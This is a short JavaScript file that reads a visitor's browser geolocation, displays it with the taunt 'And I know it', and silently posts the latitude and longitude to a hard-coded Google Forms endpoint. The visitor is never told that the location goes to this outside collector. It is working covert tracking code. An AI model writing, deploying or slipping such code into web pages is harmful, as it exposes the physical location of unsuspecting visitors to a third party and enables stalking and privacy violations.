function sendLocationToGoogleForm(latitude, longitude) {
    const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSdxTw7tsM-Ywv2BWDQ5QtOpOoqeLC_9vAogr7RDDCr4OnAR-w/formResponse";

    // Replace entry IDs with your actual ones from Google Forms
    const formData = new URLSearchParams();
    formData.append("entry.1622877945", latitude);  // Latitude
    formData.append("entry.603826075", longitude); // Longitude

    fetch(formURL, {
        method: "POST",
        body: formData,
        mode: "no-cors" // Prevents CORS issues
    })
    .then(() => console.log("Location sent to Google Form"))
    .catch(error => console.error("Error sending location:", error));
}

function getLocation() {
    const output = document.getElementById("output");

    if (navigator.geolocation) {
        output.textContent = "Connecting...";
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                output.innerHTML = `Your Location: Latitude ${latitude}, Longitude ${longitude}<br><span class="green-text">And I know it ðŸ¤£</span>`;

                // Send location to Google Form
                sendLocationToGoogleForm(latitude, longitude);
            },
            (error) => {
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        output.textContent = "Permission denied. Please allow location access.";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        output.textContent = "Location information is unavailable.";
                        break;
                    case error.TIMEOUT:
                        output.textContent = "The request to get your location timed out.";
                        break;
                    default:
                        output.textContent = "An unknown error occurred.";
                }
            }
        );
    } else {
        output.textContent = "Geolocation is not supported by your browser.";
    }
}
